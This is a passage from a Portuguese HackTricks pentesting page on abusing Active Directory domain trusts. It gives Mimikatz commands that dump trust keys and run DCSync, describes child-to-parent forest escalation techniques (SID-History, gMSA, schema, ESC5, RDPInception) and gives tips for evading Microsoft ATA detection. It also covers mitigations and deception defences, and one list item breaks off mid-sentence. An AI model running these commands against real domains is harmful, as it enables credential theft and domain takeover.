Em alto nível, uma [**confiança de domínio**](http://technet.microsoft.com/en-us/library/cc759554\(v=ws.10\).aspx) estabelece a capacidade de **usuários em um domínio se autenticarem** em recursos ou agirem como um [principal de segurança](https://technet.microsoft.com/en-us/library/cc780957\(v=ws.10\).aspx) **em outro domínio**.

Essencialmente, tudo o que uma confiança faz é **ligar os sistemas de autenticação de dois domínios** e permitir que o tráfego de autenticação flua entre eles através de um sistema de referências.\
Quando **2 domínios confiam um no outro, eles trocam chaves**, essas **chaves** serão **salvas** nos **DCs** de **cada domínio** (**2 chaves por direção de confiança, mais recente e anterior**) e as chaves serão a base da confiança.

Quando um **usuário** tenta **acessar** um **serviço** no **domínio confiante**, ele solicitará um **TGT inter-reino** ao DC de seu domínio. O DC servirá ao cliente este **TGT** que seria **criptografado/assinado** com a **chave inter-reino** (a chave que ambos os domínios **trocaram**). Então, o **cliente** irá **acessar** o **DC do outro domínio** e **solicitará** um **TGS** para o serviço usando o **TGT inter-reino**. O **DC** do domínio confiante **verificará** a **chave** usada, se estiver ok, ele **confiará em tudo naquele bilhete** e servirá o TGS ao cliente.

![](<../../.gitbook/assets/image (166) (1).png>)

### Diferentes confianças

É importante notar que **uma confiança pode ser de 1 via ou de 2 vias**. Nas opções de 2 vias, ambos os domínios confiarão um no outro, mas na confiança de **1 via**, um dos domínios será o **confiável** e o outro o **confiante**. No último caso, **você só poderá acessar recursos dentro do domínio confiante a partir do domínio confiável**.

Se o Domínio A confia no Domínio B, A é o domínio confiante e B é o confiável. Além disso, no **Domínio A**, isso seria uma **confiança de saída**; e no **Domínio B**, isso seria uma **confiança de entrada**.

**Diferentes relações de confiança**

* **Pai-Filho** – parte da mesma floresta – um domínio filho mantém uma confiança transitiva bidirecional implícita com seu pai. Este é provavelmente o tipo mais comum de confiança que você encontrará.
* **Cross-link** – também conhecida como "confiança de atalho" entre domínios filhos para melhorar os tempos de referência. Normalmente, referências em uma floresta complexa têm que filtrar até a raiz da floresta e depois voltar para o domínio alvo, então para um cenário geograficamente disperso, cross-links podem fazer sentido para reduzir os tempos de autenticação.
* **Externa** – uma confiança não transitiva implicitamente criada entre domínios distintos. "[Confianças externas fornecem acesso a recursos em um domínio fora da floresta que não está já unido por uma confiança de floresta.](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx)" Confianças externas impõem filtragem de SID, uma proteção de segurança abordada mais adiante neste post.
* **Raiz da Árvore** – uma
```
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
{% hint style="warning" %}
Existem **2 chaves confiáveis**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
Você pode verificar a usada pelo domínio atual com:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```
#### Injeção de SID-History

Escalada como administrador da empresa para o domínio filho/pai abusando da confiança com injeção de SID-History:

{% content-ref url="sid-history-injection.md" %}
[sid-history-injection.md](sid-history-injection.md)
{% endcontent-ref %}

#### Explorar NC de Configuração editável

O NC de Configuração é o repositório primário para informações de configuração de uma floresta e é replicado para cada DC na floresta. Além disso, cada DC editável (não apenas de leitura) na floresta possui uma cópia editável do NC de Configuração. Explorar isso requer execução como SYSTEM em um DC (filho).

É possível comprometer o domínio raiz de várias maneiras abordadas abaixo.

**Vincular GPO ao site do DC raiz**

O contêiner Sites no NC de Configuração contém todos os sites dos computadores associados ao domínio na floresta AD. É possível vincular GPOs aos sites quando executado como SYSTEM em qualquer DC na floresta, incluindo o(s) site(s) dos DCs raiz da floresta, e assim comprometer estes.

Mais detalhes podem ser lidos aqui [Pesquisa de Bypass SID filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Comprometer qualquer gMSA na floresta**

O ataque depende de gMSAs privilegiados no domínio alvo.

A chave raiz KDS, que é usada para calcular a senha dos gMSAs na floresta, é armazenada no NC de Configuração. Quando executado como SYSTEM em qualquer DC na floresta, pode-se ler a chave raiz KDS e calcular a senha de qualquer gMSA na floresta.

Mais detalhes podem ser lidos aqui: [Ataque de confiança Golden gMSA de filho para pai](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Ataque de mudança de esquema**

O ataque requer que o atacante espere pela criação de novos objetos AD privilegiados.

Quando executado como SYSTEM em qualquer DC na floresta, pode-se conceder a qualquer usuário controle total sobre todas as classes no Esquema AD. Esse controle pode ser abusado para criar um ACE no descritor de segurança padrão de qualquer objeto AD que concede controle total a um principal comprometido. Todas as novas instâncias dos tipos de objeto AD modificados terão este ACE.

Mais detalhes podem ser lidos aqui: [Ataque de confiança de mudança de esquema de filho para pai](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**De DA para EA com ADCS ESC5**

Os ataques ADCS ESC5 (Vulnerable PKI Object Access Control) abusam do controle sobre objetos PKI para criar um modelo de certificado vulnerável que pode ser abusado para autenticar como qualquer usuário na floresta. Como todos os objetos PKI são armazenados no NC de Configuração, pode-se executar ESC5 se tiverem comprometido qualquer DC editável (filho) na floresta.

Mais detalhes podem ser lidos aqui: [De DA para EA com ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)

Caso a floresta AD não tenha ADCS, o atacante pode criar os componentes necessários conforme descrito aqui: [Escalando de administradores de domínio filho para administradores da empresa em 5 minutos abusando do AD CS, um acompanhamento](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domínio de Floresta Externa - Unidirecional (Entrada) ou bidirecional
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, **o seu domínio é confiável** por um externo, concedendo-lhe **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principais do seu domínio têm qual acesso sobre o domínio externo** e, em seguida, tentar explorá-lo:

{% content-ref url="external-forest-domain-oneway-inbound.md" %}
[external-forest-domain-oneway-inbound.md](external-forest-domain-oneway-inbound.md)
{% endcontent-ref %}

### Domínio de Floresta Externa - Unidirecional (Saída)
```powershell
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiável** pelo domínio confiante, o domínio confiável **cria um usuário** com um **nome previsível** que usa como **senha a senha confiável**. Isso significa que é possível **acessar um usuário do domínio confiante para entrar no domínio confiável** para enumerá-lo e tentar escalar mais privilégios:

{% content-ref url="external-forest-domain-one-way-outbound.md" %}
[external-forest-domain-one-way-outbound.md](external-forest-domain-one-way-outbound.md)
{% endcontent-ref %}

Outra maneira de comprometer o domínio confiável é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança do domínio (o que não é muito comum).

Outra maneira de comprometer o domínio confiável é esperar em uma máquina onde um **usuário do domínio confiável possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Esta técnica é chamada de **RDPInception.**

{% content-ref url="rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](rdp-sessions-abuse.md)
{% endcontent-ref %}

### Mitigação de abuso de confiança de domínio

**Filtragem de SID:**

* Evita ataques que abusam do atributo de histórico de SID através da confiança entre florestas.
* Ativado por padrão em todas as confianças entre florestas. Confianças intra-floresta são consideradas seguras por padrão (MS considera a floresta e não o domínio como um limite de segurança).
* Mas, como a filtragem de SID tem potencial para quebrar aplicações e acesso de usuários, muitas vezes é desativada.
* Autenticação Seletiva
* Em uma confiança entre florestas, se a Autenticação Seletiva estiver configurada, usuários entre as confianças não serão automaticamente autenticados. Deve ser concedido acesso individual a domínios e servidores no domínio/floresta confiante.
* Não impede a exploração de NC Configration gravável e ataque de conta de confiança.

[**Mais informações sobre confianças de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Nuvem & Nuvem -> AD

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements/azure-ad-connect-hybrid-identity" %}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)\
**Por favor, encontre algumas migrações contra cada técnica na descrição da técnica.**

* Não permitir que Administradores de Domínio façam login em outros hosts além dos Controladores de Domínio
* Nunca executar um serviço com privilégios de DA
* Se você precisar de privilégios de administrador de domínio, limite o tempo: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### Engano

* Senha não expira
* Confiável para Delegação
* Usuários com SPN
* Senha na descrição
* Usuários que são membros de grupos de alto privilégio
* Usuários com direitos de ACL sobre outros usuários, grupos ou contêineres
* Objetos de computador
* ...
* [https://github.com/samratashok/Deploy-Deception](https://github.com/samratashok/Deploy-Deception)
* `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`

## Como identificar engano

**Para objetos de usuário:**

* ObjectSID (diferente do domínio)
* lastLogon, lastlogontimestamp
* Logoncount (número muito baixo é suspeito)
* whenCreated
* Badpwdcount (número muito baixo é suspeito)

**Geral:**

* Algumas soluções preenchem com informações em todos os atributos possíveis. Por exemplo, compare os atributos de um objeto de computador com o atributo de um objeto de computador 100% real como DC. Ou usuários contra o RID 500 (admin padrão).
* Verifique se algo é bom demais para ser verdade
* [https://github.com/JavelinNetworks/HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)

### Bypassing Microsoft ATA detection

#### Enumeração de usuários

ATA só reclama quando você tenta enumerar sessões no DC, então se você não procurar por sessões no DC, mas no resto dos hosts, provavelmente não será detectado.

#### Criação de impersonation de Tickets (Over pass the hash, golden ticket...)

Sempre crie os tickets usando as chaves **aes** também porque o que ATA identifica como malicioso é a degradação para NTLM.

#### DCSync

Se você não executar isso de um Controlador de Domínio, ATA vai te pegar, desculpe.

## Mais Ferramentas

* [Script Powershell para automação de auditoria de domínio](https://github.com/phillips321/adaudit)
* [Script Python para enumerar active directory](https://github.com/ropnop/windapsearch)
* [Script Python para enumerar active directory](https://github.com/CroweCybersecurity/ad-ldap-enum)

## Referências

* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**merchandising oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
